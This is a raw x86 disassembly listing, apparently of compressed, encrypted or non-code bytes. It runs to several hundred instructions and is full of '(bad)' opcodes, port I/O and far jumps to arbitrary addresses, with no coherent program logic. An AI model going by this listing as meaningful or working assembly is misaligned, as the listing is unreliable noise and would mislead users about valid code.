  40422a:	and    DWORD PTR [ebp+0x54],edx
  40422d:	mov    bh,bh
  40422f:	inc    eax
  404230:	and    bl,cl
  404232:	(bad)  
  404233:	cmp    ecx,esp
  404235:	fdiv   DWORD PTR [esp+eax*2+0x70]
  404239:	adc    BYTE PTR [ebp-0x7cf18a80],al
  40423f:	dec    ebx
  404240:	out    dx,al
  404241:	push   ebx
  404242:	or     BYTE PTR gs:[ebx-0x7e3b064],bh
  404249:	test   ecx,edx
  40424b:	call   0xbd034436
  404250:	sahf   
  404251:	xchg   ecx,eax
  404252:	inc    esi
  404253:	(bad)  
  404255:	dec    esi
  404256:	addr16 mov ds:0x7287,al
  40425a:	mov    BYTE PTR [ecx-0x19],bh
  40425d:	das    
  40425e:	xchg   edi,eax
  40425f:	mov    ds:0x421ec80c,eax
  404264:	rcr    DWORD PTR [eax],cl
  404266:	sbb    eax,0xf9474c91
  40426b:	xchg   ebp,eax
  40426c:	xor    ah,ch
  40426e:	and    eax,DWORD PTR [ebx+ecx*1-0x2983ff89]
  404275:	push   edi
  404277:	push   ds
  404278:	scas   eax,DWORD PTR es:[edi]
  404279:	mov    WORD PTR [ebx-0x5c],?
  40427c:	adc    eax,DWORD PTR [ebx]
  40427e:	inc    esp
  40427f:	std    
  404280:	push   es
  404281:	cmp    BYTE PTR ss:[ebx],dl
  404284:	les    edx,FWORD PTR [edx-0x2c7ef6cd]
  40428a:	dec    esi
  40428b:	addr16 xchg esp,eax
  40428d:	mov    bl,BYTE PTR [eax+0x3f]
  404290:	xchg   edx,eax
  404291:	aaa    
  404292:	xchg   bh,cl
  404294:	adc    BYTE PTR [edx],ch
  404296:	loop   0x404265
  404298:	repnz fmul DWORD PTR [ebx+0x31ece68a]
  40429f:	jp     0x4042e4
  4042a1:	add    esp,DWORD PTR [ecx]
  4042a3:	mov    ds:0x2754a9cf,al
  4042a8:	lds    edx,FWORD PTR [esi+0x6e819355]
  4042ae:	int3   
  4042af:	or     ebx,DWORD PTR [ebx-0x22]
  4042b2:	mov    WORD PTR [esi+0x2],fs
  4042b5:	lds    edi,FWORD PTR [edx+0x26c28c29]
  4042bb:	shl    ah,cl
  4042bd:	and    esp,edi
  4042bf:	xchg   BYTE PTR [ebx+0x1f9a1c5d],ah
  4042c5:	in     al,0xa1
  4042c7:	jecxz  0x40429c
  4042c9:	mov    al,ds:0xb95393db
  4042ce:	out    dx,eax
  4042cf:	ror    ah,cl
  4042d1:	(bad)  
  4042d2:	scas   al,BYTE PTR es:[edi]
  4042d3:	pop    ebx
  4042d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042d5:	retf   0x463f
  4042d8:	scas   al,BYTE PTR es:[edi]
  4042d9:	aas    
  4042da:	in     eax,0xc1
  4042dc:	ret    
  4042dd:	add    al,0xde
  4042df:	xchg   edx,eax
  4042e0:	scas   eax,DWORD PTR es:[edi]
  4042e1:	daa    
  4042e2:	nop
  4042e3:	sbb    eax,0x56369548
  4042e8:	stc    
  4042e9:	in     al,0xb1
  4042eb:	and    DWORD PTR ds:0xcac58a7f,ebp
  4042f1:	js     0x404325
  4042f3:	(bad)  
  4042f4:	fisub  WORD PTR [esi-0x7dbf1646]
  4042fa:	inc    ebp
  4042fb:	aam    0x59
  4042fd:	dec    eax
  4042fe:	dec    esi
  4042ff:	push   ebp
  404300:	and    ebx,0x17bd66be
  404306:	cmc    
  404307:	jb     0x4042b5
  404309:	jbe    0x40432a
  40430b:	sti    
  40430c:	gs jne 0x40429f
  40430f:	sti    
  404310:	outs   dx,DWORD PTR ds:[esi]
  404311:	retf   0x7833
  404314:	adc    eax,0xa7fd6dea
  404319:	push   esi
  40431a:	outs   dx,BYTE PTR ds:[esi]
  40431b:	retf   0xa15b
  40431e:	popf   
  40431f:	push   0xffffffb5
  404321:	imul   ecx,DWORD PTR [edx+0x76fe075a],0x3e56f092
  40432b:	je     0x40436f
  40432d:	jge    0x404356
  40432f:	outs   dx,BYTE PTR ds:[esi]
  404330:	mov    bl,0x8a
  404332:	(bad)  
  404333:	mov    dh,0xb5
  404335:	fisub  WORD PTR [esi]
  404337:	sbb    BYTE PTR [esi-0x4becf23],dh
  40433d:	rcr    BYTE PTR [ebp+0x6004f17e],1
  404343:	pop    esp
  404344:	cmc    
  404345:	repz ror eax,cl
  404348:	pop    ss
  404349:	ds out dx,al
  40434b:	inc    esi
  40434c:	adc    eax,0x699b7790
  404351:	imul   ecx,eax,0x6e
  404354:	loop   0x404324
  404356:	cs sbb ah,BYTE PTR es:[esi]
  40435a:	pop    ecx
  40435b:	in     al,dx
  40435c:	mov    al,bl
  40435e:	and    dl,BYTE PTR [esi+esi*1]
  404361:	jecxz  0x4042ee
  404363:	pop    esi
  404364:	gs xor eax,0x4b126279
  40436a:	aam    0xfd
  40436c:	cmp    esi,DWORD PTR [ecx-0x6]
  40436f:	jge    0x404315
  404371:	es dec esi
  404373:	pcmpgtw mm2,QWORD PTR [edi]
  404376:	ss and al,ch
  404379:	fidivr DWORD PTR [ecx-0x639d78db]
  40437f:	sub    al,0xbd
  404381:	xor    BYTE PTR [ebp-0x4a],bl
  404384:	mov    eax,ds:0xcb3fa454
  404389:	fisubr WORD PTR [ebp-0x17730f8e]
  40438f:	mov    bh,0xe7
  404391:	scas   eax,DWORD PTR es:[edi]
  404392:	dec    eax
  404393:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404394:	dec    ebx
  404395:	(bad)
  404398:	shl    DWORD PTR [edx],cl
  40439a:	sub    al,0x0
  40439c:	xor    BYTE PTR [ebp-0x506b1f45],0xdf
  4043a3:	ins    DWORD PTR es:[edi],dx
  4043a4:	test   eax,0x9a394ccb
  4043a9:	out    0x51,eax
  4043ab:	xchg   ebx,eax
  4043ac:	mov    edi,0x3597c2ba
  4043b1:	jg     0x40438e
  4043b3:	push   cs
  4043b4:	dec    esi
  4043b5:	inc    ebp
  4043b6:	clc    
  4043b7:	loope  0x404364
  4043b9:	sbb    eax,ebx
  4043bb:	enter  0x43ed,0x41
  4043bf:	dec    ebx
  4043c0:	xchg   edx,eax
  4043c1:	dec    esp
  4043c2:	repnz fst QWORD PTR [edx+ebp*8]
  4043c6:	cmp    eax,0x84966069
  4043cb:	xor    al,0x65
  4043cd:	fst    QWORD PTR [eax+edx*4+0x2f4b303b]
  4043d4:	xchg   edx,eax
  4043d5:	(bad)  
  4043d6:	push   eax
  4043d7:	push   edx
  4043d8:	sub    eax,0x493d7afb
  4043dd:	and    edx,DWORD PTR [edi]
  4043df:	ja     0x404383
  4043e1:	dec    esp
  4043e2:	loopne 0x4043b7
  4043e4:	mov    esp,0x21f43669
  4043e9:	jmp    0xbd16deb2
  4043ee:	cmp    al,0xe5
  4043f0:	loop   0x404426
  4043f2:	sub    al,0xd7
  4043f4:	xchg   ebx,eax
  4043f5:	xor    DWORD PTR [edi-0x3e],esp
  4043f8:	ins    BYTE PTR es:[edi],dx
  4043f9:	xor    BYTE PTR [ecx+ebp*8+0x47],al
  4043fd:	xchg   edi,eax
  4043fe:	imul   esp,DWORD PTR [eax-0x7a47f414],0x26ce40b4
  404408:	out    0x9b,eax
  40440a:	push   esp
  40440b:	dec    edi
  40440c:	pushf  
  40440d:	mov    al,0x86
  40440f:	dec    ebp
  404410:	xor    esi,edi
  404412:	int3   
  404413:	and    dl,BYTE PTR [eax+0xe312224]
  404419:	inc    esp
  40441a:	test   ebp,ebp
  40441c:	lahf   
  40441d:	cs sbb al,0x7c
  404420:	add    edx,ebx
  404422:	daa    
  404423:	shl    BYTE PTR [edi-0x6],0xd0
  404427:	sub    al,0x3
  404429:	pop    ax
  40442b:	or     al,0xf4
  40442d:	les    ecx,FWORD PTR [ebx+0xe]
  404430:	aaa    
  404431:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404432:	iret   
  404433:	sbb    eax,0x9535e340
  404438:	mov    WORD PTR [esi+0x7f],?
  40443b:	repz aad 0xa6
  40443e:	imul   esp
  404440:	fcomip st,st(3)
  404442:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404443:	stc    
  404444:	add    DWORD PTR [eax+0x10dedf2e],edi
  40444a:	sahf   
  40444b:	call   0x5982784e
  404450:	cli    
  404451:	jmp    0xe5eebc4f
  404456:	mov    eax,ds:0x5d9fc8d9
  40445b:	dec    edx
  40445c:	pop    edi
  40445d:	jne    0x40449c
  40445f:	fidiv  DWORD PTR [bx+si]
  404462:	test   al,0xe9
  404464:	mov    eax,ds:0x69dbe1bc
  404469:	popf   
  40446a:	inc    ebx
  40446b:	scas   al,BYTE PTR es:[edi]
  40446c:	mov    es,WORD PTR [esi+0x6f857d81]
  404472:	pusha  
  404473:	jo     0x40444c
  404475:	js     0x404421
  404477:	outs   dx,BYTE PTR ds:[esi]
  404478:	mov    bh,0x81
  40447a:	sub    bl,BYTE PTR [ecx-0x234bf986]
  404480:	and    DWORD PTR [ecx],esi
  404482:	rcr    dl,cl
  404484:	ins    DWORD PTR es:[edi],dx
  404485:	sbb    eax,0xb34de2d0
  40448a:	rcl    DWORD PTR [eax],cl
  40448c:	dec    esp
  40448d:	xor    al,0xb9
  40448f:	in     al,0xbc
  404491:	sbb    DWORD PTR [edx],esi
  404493:	or     BYTE PTR [esi],0xb5
  404496:	push   ecx
  404497:	and    ebx,DWORD PTR [edx-0x5298de47]
  40449d:	pop    ebx
  40449e:	int3   
  40449f:	loopne 0x404427
  4044a1:	aaa    
  4044a2:	jl     0x4044e4
  4044a4:	and    al,BYTE PTR [edi+edi*8+0x67b1c04f]
  4044ab:	(bad)  
  4044ac:	icebp  
  4044ad:	cli    
  4044ae:	push   ebp
  4044af:	jae    0x404457
  4044b1:	scas   eax,DWORD PTR es:[edi]
  4044b2:	js     0x404478
  4044b4:	jecxz  0x404455
  4044b6:	(bad)  
  4044b8:	push   0x55
  4044ba:	dec    ebx
  4044bb:	sbb    eax,0x2b2c3821
  4044c0:	pop    ebx
  4044c1:	inc    edi
  4044c2:	mov    eax,0x7d4d933a
  4044c7:	xchg   edi,eax
  4044c8:	sbb    BYTE PTR [ecx+edi*2],dl
  4044cb:	inc    esp
  4044cc:	inc    eax
  4044cd:	test   BYTE PTR [edx+0x26],bh
  4044d0:	add    BYTE PTR [ecx],cl
  4044d2:	pop    edi
  4044d3:	punpckldq mm4,DWORD PTR [edi+0x7d]
  4044d7:	addr16 dec ebx
  4044d9:	inc    ecx
  4044da:	xor    esi,DWORD PTR [eax+0x2c30774f]
  4044e0:	mov    eax,ds:0xa021138f
  4044e5:	push   eax
  4044e6:	mov    cl,0x89
  4044e8:	shl    DWORD PTR [edi-0x33f2fe42],1
  4044ee:	jg     0x40455e
  4044f0:	add    DWORD PTR [ecx-0x69755a83],esp
  4044f6:	add    DWORD PTR [edi+0x2802872d],eax
  4044fc:	push   0x6
  4044fe:	imul   esp,DWORD PTR [ecx],0xf8c23e3
  404504:	mov    ch,0x20
  404506:	jle    0x404508
  404508:	push   esp
  404509:	outs   dx,DWORD PTR ds:[esi]
  40450a:	scas   al,BYTE PTR es:[edi]
  40450b:	into   
  40450c:	dec    edx
  40450d:	jmp    0xe562:0xd5fee6d2
  404514:	mov    fs:0xb70a4728,al
  40451a:	xchg   edx,eax
  40451b:	jne    0x404545
  40451d:	dec    ebx
  40451e:	lahf   
  40451f:	test   eax,0xf250bcda
  404524:	(bad)  
  404525:	int    0xfe
  404527:	mov    al,ds:0x4d984dda
  40452c:	add    al,0xac
  40452e:	mov    ds:0x5867bfe3,al
  404533:	mov    esp,0x1c63e4ae
  404538:	jns    0x40454c
  40453a:	in     al,dx
  40453b:	addr16 mov cl,0xad
  40453e:	jle    0x4044c4
  404540:	fbstp  TBYTE PTR [eax]
  404542:	mov    bh,0x43
  404544:	scas   eax,DWORD PTR es:[edi]
  404545:	dec    edx
  404546:	int3   
  404547:	retf   0x8bbd
  40454a:	sub    BYTE PTR [esi-0x4f1f4e1e],0x26
  404551:	push   ss
  404552:	dec    ebx
  404553:	ret    0x48a5
  404556:	inc    eax
  404557:	xor    ebx,eax
  404559:	dec    ecx
  40455a:	pushf  
  40455b:	inc    ecx
  40455c:	and    ecx,DWORD PTR [esi+0x1b]
  40455f:	push   ecx
  404560:	inc    esp
  404561:	mov    ds:0x9ea34d25,eax
  404566:	bnd ja 0x404536
  404569:	and    eax,0xf0c361a9
  40456e:	mov    BYTE PTR ds:0xeeaef2df,ah
  404574:	jbe    0x404584
  404576:	repnz aaa 
  404578:	scas   al,BYTE PTR es:[edi]
  404579:	mov    bh,0xf9
  40457b:	mov    ch,0xd0
  40457d:	add    BYTE PTR [edx],ch
  40457f:	xchg   BYTE PTR [esp+edx*2+0x53],bh
  404583:	mov    ds:0x6e66266e,eax
  404588:	imul   esp,DWORD PTR [ebp-0x76cbc09e],0xffffffaf
  40458f:	in     eax,0x5e
  404591:	xor    eax,0x2fa98663
  404596:	shl    DWORD PTR [edi],0x6a
  404599:	lods   eax,DWORD PTR ds:[esi]
  40459a:	ins    BYTE PTR es:[edi],dx
  40459b:	sub    BYTE PTR [edi],dl
  40459d:	cwde   
  40459e:	push   eax
  40459f:	push   edi
  4045a0:	int    0x49
  4045a2:	out    0x59,eax
  4045a4:	and    al,BYTE PTR [edi+eax*2]
  4045a7:	ficom  DWORD PTR ds:[ecx+edx*4+0x5d]
  4045ac:	outs   dx,BYTE PTR ds:[esi]
  4045ad:	imul   eax,DWORD PTR [esi-0x713d265f],0x78aa67f2
  4045b7:	int    0xa0
  4045b9:	rcr    BYTE PTR [eax],0xb9
  4045bc:	jbe    0x404600
  4045be:	test   dh,bl
  4045c0:	mov    ah,0x37
  4045c2:	adc    al,0x7a
  4045c4:	xchg   esp,eax
  4045c5:	mov    dl,0x8c
  4045c7:	push   ebp
  4045c8:	ret    0xe3a3
  4045cb:	jo     0x40463e
  4045cd:	dec    esp
  4045ce:	ins    BYTE PTR es:[edi],dx
  4045cf:	add    al,0x6b
  4045d1:	sbb    DWORD PTR [edx-0x47024c5f],ebx
  4045d7:	or     ah,ch
  4045d9:	pop    ss
  4045da:	jg     0x404592
  4045dc:	(bad)  
  4045dd:	fistp  WORD PTR [esi-0x4f7eea35]
  4045e3:	xchg   ecx,eax
  4045e4:	out    0xb9,al
  4045e6:	int    0x7a
  4045e8:	ss int3 
  4045ea:	adc    al,0x29
  4045ec:	retf   
  4045ed:	mov    al,0xfa
  4045ef:	mov    al,0xd4
  4045f1:	loopne 0x404622
  4045f3:	sahf   
  4045f4:	xor    BYTE PTR [edi+0x64],dh
  4045f7:	(bad)  
  4045f8:	push   ds
  4045f9:	retf   0xc7d7
  4045fc:	(bad)  
  4045fd:	jl     0x4045d9
  4045ff:	xchg   esi,eax
  404600:	mov    ds:0x2309cc99,eax
  404605:	in     eax,dx
  404606:	repnz mov al,0xb2
  404609:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40460a:	mov    BYTE PTR [ebx+0x1b],bh
  40460d:	mov    edi,0x1737617d
  404612:	push   DWORD PTR [esp+edx*1]
  404615:	mov    edx,0xedf82b68
  40461a:	adc    BYTE PTR [ebp-0xcb562b4],ch
  404620:	mov    ch,0xf
  404622:	sub    DWORD PTR [edi+0x7c],esi
  404625:	scas   eax,DWORD PTR es:[edi]
  404626:	mov    BYTE PTR gs:[eax+0x12],ch
  40462a:	mov    ecx,0x5946181b
  40462f:	retf   
  404630:	pushf  
  404631:	sar    BYTE PTR [eax+0x58],0xf5
  404635:	cmp    eax,0xb7793997
  40463a:	les    ecx,FWORD PTR [eax-0x67fa47de]
  404640:	loop   0x404652
  404642:	sbb    ecx,esi
  404644:	mov    dl,0xac
  404646:	loope  0x404679
  404648:	test   al,0xfa
  40464a:	mov    bh,0x0
  40464c:	add    cl,BYTE PTR [edx]
  40464e:	jge    0x404657
  404650:	pop    es
  404651:	int3   
  404652:	(bad)
  404657:	fiadd  WORD PTR [eax+0x6b]
  40465a:	fcmovnbe st,st(1)
  40465c:	neg    DWORD PTR [esi]
  40465e:	inc    esp
  40465f:	outs   dx,BYTE PTR ds:[esi]
  404660:	cmp    cl,BYTE PTR [ebx]
  404662:	cmp    al,0xe3
  404664:	xor    BYTE PTR [ecx],dh
  404666:	xchg   esp,eax
  404667:	mov    edi,0xe4251e5f
  40466c:	xor    DWORD PTR [edi-0x80],ecx
  40466f:	test   BYTE PTR [edi-0x2b],dl
  404672:	sti    
  404673:	scas   eax,DWORD PTR es:[edi]
  404674:	call   0x817e:0xb72ec08a
  40467b:	mov    edx,0x2bf86667
  404680:	div    DWORD PTR [ecx+0x24a42fce]
  404686:	cmovo  ebp,DWORD PTR [edx-0x73]
  40468a:	mov    ds:0x829e404b,eax
  40468f:	add    al,0x35
  404691:	test   al,0xf8
  404693:	mov    ebp,0xb63ebe35
  404698:	ficomp DWORD PTR [ecx+esi*8+0x116b2ec]
  40469f:	mov    ch,0x11
  4046a1:	sahf   
  4046a2:	imul   edx,DWORD PTR [ebx+0x0],0xffffffc4
  4046a6:	iret   
  4046a7:	enter  0xd27a,0xba
  4046ab:	sub    DWORD PTR [edx-0x2afaab4f],edi
  4046b1:	add    edx,DWORD PTR [ebx+eax*8]
  4046b4:	push   eax
  4046b5:	mov    ebp,0xc250e61d
  4046ba:	jbe    0x40472e
  4046bc:	xor    ch,BYTE PTR [ecx]
  4046be:	rcr    BYTE PTR [edi+0x37],0x5f
  4046c2:	sub    BYTE PTR ds:[edi],ch
  4046c5:	std    
  4046c6:	int    0xb3
  4046c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046c9:	dec    ecx
  4046ca:	fxch   st(7)
  4046cc:	mov    al,0xd3
  4046ce:	xchg   ecx,eax
  4046cf:	jg     0x404721
  4046d1:	ss pop edx
  4046d3:	pop    ss
  4046d4:	jae    0x40467b
  4046d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046d7:	mov    edx,0x153dbabd
  4046dc:	daa    
  4046dd:	jo     0x4046e7
  4046df:	jmp    0xbea44207
  4046e4:	pop    ebp
  4046e5:	push   0xffffffc8
  4046e7:	pop    es
  4046e8:	fnstcw WORD PTR [edx-0x1c]
  4046eb:	lods   al,BYTE PTR ds:[esi]
  4046ec:	jno    0x40476c
  4046ee:	outs   dx,DWORD PTR ds:[esi]
  4046ef:	mov    edx,0x16cf2e88
  4046f4:	std    
  4046f5:	cmp    BYTE PTR [ebx-0x7e],bh
  4046f8:	std    
  4046f9:	cs cld 
  4046fb:	pop    ecx
  4046fc:	sbb    edx,DWORD PTR ds:0x49b01307
  404702:	xchg   BYTE PTR [edi-0x58305f80],dh
  404708:	les    ebp,FWORD PTR [edi-0x3d]
  40470b:	enter  0xae1b,0x50
  40470f:	(bad)  
  404710:	retf   
  404711:	adc    eax,0xc3b01003
  404716:	jne    0x4046b5
  404718:	push   ds
  404719:	pop    es
  40471a:	mov    eax,ds:0xfc575eb9
  40471f:	sbb    eax,0xcf2361e5
  404724:	xchg   BYTE PTR [eax-0x3c07a674],dh
  40472a:	mov    ds:0x4c4cf796,al
  40472f:	repnz sti 
  404731:	dec    DWORD PTR [edi-0x20]
  404734:	gs pop esp
  404736:	stos   DWORD PTR es:[edi],eax
  404737:	mov    WORD PTR [ecx+0x21127098],ss
  40473d:	addr16 pop edi
  40473f:	and    BYTE PTR [eax+0x2a],cl
  404742:	mov    ds:0xfae8090d,al
  404747:	pop    ebp
  404748:	push   esp
  404749:	sub    DWORD PTR ds:[eax],0x49ded506
  404750:	xchg   edi,esp
  404752:	jecxz  0x404798
  404754:	adc    eax,0x421a5445
  404759:	in     al,0xc3
  40475b:	dec    ecx
  40475c:	mov    eax,0x5fa4ee01
  404761:	jnp    0x4047cc
  404763:	mov    esi,0x82b8a0fd
  404768:	and    ebp,esp
  40476a:	or     BYTE PTR [ecx-0x6185433d],ch
  404770:	push   0xffffffe6
  404772:	fwait
  404773:	daa    
  404774:	mov    ds:0x7014e4d2,al
  404779:	xor    eax,0x5e96a233
  40477e:	cmp    eax,0x62d7d64d
  404783:	push   0xffffff96
  404785:	dec    ebx
  404786:	adc    BYTE PTR [edi],dl
  404788:	js     0x40477b
  40478a:	repz gs adc al,0xb4
  40478e:	xor    cl,BYTE PTR [edi]
  404790:	jl     0x404724
  404792:	dec    ebp
  404793:	inc    ebx
  404794:	popf   
  404795:	sahf   
  404796:	inc    esp
  404797:	add    DWORD PTR [ebx],ebx
  404799:	addr16 test eax,0x66ffa1d6
  40479f:	fdiv   QWORD PTR [edx+edx*2+0x6]
  4047a3:	mov    esp,0xb9f7e395
  4047a8:	jne    0x40477d
  4047aa:	out    0x16,eax
  4047ac:	dec    edx
  4047ad:	js     0x4047a4
  4047af:	jmp    0xccab:0xd7c32be1
  4047b6:	or     al,0xc7
  4047b8:	mov    eax,0xc8869084
  4047bd:	dec    eax
  4047be:	lock cdq 
  4047c0:	dec    edi
  4047c1:	je     0x404806
  4047c3:	cmp    al,0x7f
  4047c5:	int    0xa
  4047c7:	dec    ebx
  4047c8:	add    eax,0x9a36263e
  4047cd:	(bad)  
  4047ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047cf:	dec    ebp
  4047d0:	repz mov WORD PTR [esi],?
  4047d3:	loope  0x4047b5
  4047d5:	aad    0xfd
  4047d7:	(bad)  
  4047d8:	pop    esp
  4047d9:	retf   0x58ea
  4047dc:	ins    BYTE PTR es:[edi],dx
  4047dd:	fisubr DWORD PTR [eax-0xbc64441]
  4047e3:	mov    ebp,0xac99ecd6
  4047e8:	cmp    eax,0x3536f6cd
  4047ed:	rol    esi,1
  4047ef:	or     esp,ebx
  4047f1:	addr16 mov al,0x85
  4047f4:	jg     0x404820
  4047f6:	and    DWORD PTR [esi],edi
  4047f8:	pop    esp
  4047f9:	int    0x37
  4047fb:	ins    DWORD PTR es:[edi],dx
  4047fc:	jecxz  0x404844
  4047fe:	ficomp WORD PTR [eax]
  404800:	mov    ecx,0x91ef81c4
  404806:	ins    BYTE PTR es:[edi],dx
  404807:	jmp    0xcb6ddff4
  40480c:	clc    
  40480d:	jne    0x404881
  40480f:	iret   
  404810:	enter  0xdc56,0x6c
  404814:	xchg   esp,eax
  404815:	dec    ebx
  404816:	test   al,0xb
  404818:	and    al,0x79
  40481a:	xor    al,0xf6
  40481c:	std    
  40481d:	bound  esp,QWORD PTR [edi]
  40481f:	cmp    BYTE PTR [ebx],0xc1
  404822:	sub    DWORD PTR [ebx+ebx*8+0x3f],esi
  404826:	cmp    al,0xf1
  404828:	and    eax,0xa43ce01a
  40482d:	xchg   esp,eax
  40482e:	adc    DWORD PTR [edi],ebp
  404830:	or     al,0x4c
  404832:	out    dx,eax
  404833:	mov    ch,0xdb
  404835:	adc    DWORD PTR [ecx],0xd4c1bd23
  40483b:	push   ebp
  40483c:	jne    0x404853
  40483e:	shl    dl,1
  404840:	sti    
  404841:	add    DWORD PTR [edx],edi
  404843:	or     eax,0x9a23332b
  404848:	inc    esi
  404849:	imul   edx,DWORD PTR [esi-0x618fd791],0x69
  404850:	xchg   edi,eax
  404851:	jl     0x404879
  404853:	sar    BYTE PTR [ecx],1
  404855:	xchg   esp,eax
  404856:	ret    
  404857:	repz add DWORD PTR [esi+0x47628cee],edi
  40485e:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  404860:	(bad)  
  404861:	leave  
  404862:	iret   
  404863:	mov    eax,0x56e0dbef
  404868:	push   esp
  404869:	inc    edx
  40486a:	xchg   ah,dl
  40486c:	mov    ch,0x4
  40486e:	lods   al,BYTE PTR ds:[esi]
  40486f:	add    ebx,DWORD PTR [esi]
  404871:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404872:	sub    esi,DWORD PTR [ebx]
  404874:	and    eax,eax
  404876:	retf   0x6c47
  404879:	jmp    0x4048e1
  40487b:	arpl   WORD PTR [ebx+0x79c1f993],sp
  404881:	inc    ecx
  404882:	pop    esp
  404883:	push   eax
  404884:	or     ch,bl
  404886:	or     al,0x5e
  404888:	push   edx
  404889:	push   esp
  40488a:	mov    eax,ds:0x35787da0
  40488f:	adc    al,0x82
  404891:	cmp    ch,BYTE PTR [edi+0x1]
  404894:	xor    BYTE PTR [edi],al
  404896:	je     0x404826
  404898:	inc    eax
  404899:	hlt    
  40489a:	ins    DWORD PTR es:[edi],dx
  40489b:	sbb    ebp,DWORD PTR [ebx-0x46]
  40489e:	or     ch,ch
  4048a0:	dec    ebx
  4048a1:	iret   
  4048a2:	push   eax
  4048a3:	xor    ah,BYTE PTR [eax]
  4048a5:	mov    al,ds:0xb5aed766
  4048aa:	cdq    
  4048ab:	jl     0x404846
  4048ad:	lds    eax,FWORD PTR [edx+ebp*2]
  4048b0:	or     ecx,ecx
  4048b2:	(bad)  
  4048b3:	fmulp  st(1),st
  4048b5:	test   eax,0x75e47668
  4048ba:	das    
  4048bb:	into   
  4048bc:	pop    ebp
  4048bd:	out    0x3f,al
  4048bf:	scas   al,BYTE PTR es:[edi]
  4048c0:	mov    ah,0xd8
  4048c2:	or     DWORD PTR [edx],ebx
  4048c4:	add    edx,esi
  4048c6:	mov    DWORD PTR [esi-0x7c8b734c],0x72a7d700
  4048d0:	test   eax,0xa71f7a00
  4048d5:	fsubr  st(1),st
  4048d7:	add    eax,0x77a30b24
  4048dc:	ficom  DWORD PTR [ebp-0x77]
  4048df:	pop    ecx
  4048e0:	sahf   
  4048e1:	pop    ebx
  4048e2:	sub    ah,BYTE PTR [edi]
  4048e4:	(bad)  
  4048e5:	rcr    BYTE PTR [esi-0xe4a67d0],1
  4048eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048ec:	xor    cl,BYTE PTR [ebx]
  4048ee:	scas   al,BYTE PTR es:[edi]
  4048ef:	sub    BYTE PTR [esi+edx*1-0x7e2f6981],ah
  4048f6:	loope  0x4048b7
  4048f8:	add    bl,0x58
  4048fb:	ja     0x404903
  4048fd:	in     al,dx
  4048fe:	jo     0x4048db
  404900:	sbb    dh,BYTE PTR [esi-0x2a7baba]
  404906:	mov    bh,0x76
  404908:	lods   al,BYTE PTR ds:[esi]
  404909:	cwde   
  40490a:	cli    
  40490b:	les    edi,FWORD PTR [ebp+0x43]
  40490e:	inc    edx
  40490f:	gs push esp
  404911:	dec    edi
  404912:	mov    ecx,ebx
  404914:	or     eax,0x627f07ae
  404919:	add    bh,BYTE PTR [ebx-0x3c]
  40491c:	enter  0x2be4,0xd8
  404920:	adc    eax,ebx
  404922:	inc    ebx
  404923:	pop    ecx
  404924:	lods   al,BYTE PTR ds:[esi]
  404925:	inc    edi
  404926:	inc    edi
  404927:	mov    DWORD PTR [edi-0xbeda4d0],ecx
  40492d:	das    
  40492e:	dec    ecx
  40492f:	arpl   WORD PTR ds:0x1e30c9f5,sp
  404935:	shl    DWORD PTR [edi],1
  404937:	pushf  
  404938:	enter  0xff7c,0x2f
  40493c:	or     DWORD PTR [edi],edi
  40493e:	ficomp WORD PTR ds:0x147eca2
  404944:	xchg   esi,eax
  404945:	inc    esi
  404946:	fwait
  404947:	add    al,0x3f
  404949:	add    DWORD PTR [ecx-0x10],0xec31e6a0
  404950:	sub    eax,0x4bf4611d
  404955:	jmp    0xbe59:0x1214c1cc
  40495c:	clc    
  40495d:	std    
  40495e:	mov    ecx,0x4801a8af
  404963:	jnp    0x404974
  404965:	or     eax,0xb1aa0f09
  40496a:	cmp    al,0x32
  40496c:	loopne 0x40498f
  40496e:	push   0x79
  404970:	push   ebp
  404971:	mov    eax,0x29eff07d
  404976:	test   BYTE PTR [eax-0x10df368b],bl
  40497c:	into   
  40497d:	lods   al,BYTE PTR ds:[esi]
  40497e:	ror    DWORD PTR [ebx],1
  404980:	dec    esp
  404981:	mov    BYTE PTR [esi],ch
  404983:	pop    ds
  404984:	adc    al,0xfd
  404986:	and    al,0x9
  404988:	das    
  404989:	jns    0x4049f3
  40498b:	dec    ecx
  40498c:	sbb    DWORD PTR [ebx-0x76c71c4e],0xd4c683dd
  404996:	cmp    cl,BYTE PTR [eax+0x16a8db46]
  40499c:	nop
  40499d:	hlt    
  40499e:	inc    esp
  40499f:	add    BYTE PTR [eax+0x5d4583d6],dl
  4049a5:	pop    ebx
  4049a6:	in     al,0x39
  4049a8:	rol    BYTE PTR [eax+0x50459a3],0xfb
  4049af:	jmp    0x1719:0x8b3af662
  4049b6:	sbb    BYTE PTR [eax+0x58],dh
  4049b9:	scas   eax,DWORD PTR es:[edi]
  4049ba:	add    al,0xa9
  4049bc:	xchg   esi,eax
  4049bd:	sahf   
  4049be:	pop    DWORD PTR [esi-0x7c84c73a]
  4049c4:	mov    esi,edi
  4049c6:	ret    
  4049c7:	mov    dh,0x83
  4049c9:	mov    esp,0x41c0f3d9
  4049ce:	pop    ds
  4049cf:	mov    eax,0xc55c3edd
  4049d4:	mov    edi,0xe5797257
  4049d9:	outs   dx,BYTE PTR ds:[esi]
  4049da:	les    eax,FWORD PTR [edx]
  4049dc:	mov    ebx,0x28584247
  4049e1:	mov    eax,0x955574c2
  4049e6:	inc    ebp
  4049e7:	stos   DWORD PTR es:[edi],eax
  4049e8:	das    
  4049e9:	das    
  4049ea:	(bad)  
  4049eb:	in     eax,0xee
  4049ed:	adc    ah,bl
  4049ef:	push   esi
  4049f0:	cmp    ecx,DWORD PTR [ecx+0x56]
  4049f3:	fdivr  DWORD PTR [ecx]
  4049f5:	fptan  
  4049f7:	sub    eax,0x3fb9022f
  4049fc:	xchg   edi,eax
  4049fd:	repnz fistp WORD PTR [edi]
  404a00:	in     eax,0xcc
  404a02:	inc    edi
  404a03:	mov    ecx,0x640ae326
  404a08:	mov    WORD PTR [edx],?
  404a0a:	fld    TBYTE PTR [ebx-0x54]
  404a0d:	mov    ah,0x17
